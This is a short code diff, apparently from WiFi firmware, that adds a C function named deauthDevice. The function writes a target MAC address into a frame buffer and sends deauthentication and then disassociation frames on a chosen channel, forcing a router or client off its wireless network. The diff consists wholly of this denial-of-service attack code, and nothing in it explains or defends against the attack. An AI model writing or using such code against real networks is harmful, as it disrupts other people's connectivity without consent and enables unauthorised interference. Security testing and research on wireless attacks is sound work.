@@ -22,3 +22,23 @@ bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint
 }
 
 
+// function for deauthing router
+bool deauthDevice(uint8_t* mac, uint8_t wifi_channel) {
+    bool success = false;
+    memcpy(&packet[10], mac, 6);
+    memcpy(&packet[16], mac, 6);
+
+    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
+        success = true;
+    }
+
+    // send disassociate frame
+    packet[0] = 0xa0;
+
+    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
+        success = true;
+    }
+
+    return success;
+}
+
